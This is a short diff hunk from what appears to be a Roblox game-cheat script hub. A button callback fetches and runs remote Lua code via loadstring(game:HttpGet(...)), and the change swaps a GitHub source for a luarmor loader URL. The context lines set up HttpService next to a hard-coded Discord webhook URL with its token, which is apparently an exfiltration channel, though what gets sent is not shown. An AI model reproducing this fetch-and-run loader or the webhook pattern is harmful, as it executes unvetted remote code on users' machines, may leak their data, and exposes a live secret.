@@ -39,7 +39,7 @@ local Window = Rayfield:CreateWindow({
  local Button = Tab:CreateButton({
     Name = "Fisch",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Fisch.lua"))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/aa63ce25cd44fa60f0b155dcc3593445.lua"))()
         local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
  
